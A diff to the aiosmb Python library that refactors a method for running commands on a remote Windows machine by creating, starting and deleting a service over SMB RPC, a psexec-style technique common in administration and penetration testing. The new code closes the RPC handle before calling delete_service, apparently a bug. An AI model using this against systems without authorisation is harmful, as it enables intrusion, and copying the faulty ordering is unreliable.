@@ -23,7 +23,6 @@ from aiosmb.dcerpc.v5.dtypes import RPC_SID
 
 from aiosmb.dcerpc.v5 import tsch, scmr
 
-from aiosmb.commons.utils.decorators import red, rr, red_gen, rr_gen
 from aiosmb.commons.exceptions import SMBMachineException
 
 from aiosmb.commons.interfaces.blocking.file.file import SMBBlockingFileMgr
@@ -611,7 +610,7 @@ class SMBMachine:
 		"""
 		
 		try:
-			_, err = await self.connect_rpc('SERVICEMGR')
+			handle, err = await self.named_rpcs_proto['SERVICEMGR'].from_smbconnection(self.connection, auth_level = self.force_rpc_auth)
 			if err is not None:
 				raise err
 
@@ -631,13 +630,14 @@ class SMBMachine:
 			logger.debug('Command: %s' % command)
 
 		
-			res, err = await self.named_rpcs['SERVICEMGR'].create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
+			res, err = await handle.create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
 			if err is not None:
 				raise err
 			
-			logger.debug('Service created. Name: %s' % service_name)
+			#logger.debug('Service created. Name: %s' % service_name)
+			print('Service created. Name: %s' % service_name)
 			
-			_, err = await self.start_service(service_name)
+			_, err = await handle.start_service(service_name)
 			#if err is not None:
 			#	raise err
 
@@ -662,16 +662,18 @@ class SMBMachine:
 
 				yield data, err
 			
+			await handle.close()
+
+			logger.debug('Deleting service...')
+			_, err = await handle.delete_service(service_name)
+			if err is not None:
+				logger.warning('Failed to delete service!')
+
 			logger.debug('Deleting temp file...')
 			_, err = await temp.delete()
 			if err is not None:
 				logger.warning('Failed to delete temp file!')
 
-			logger.debug('Deleting service...')
-			_, err = await self.delete_service(service_name)
-			if err is not None:
-				logger.warning('Failed to delete service!')
-			
 			yield None, None
 
 		except Exception as e:
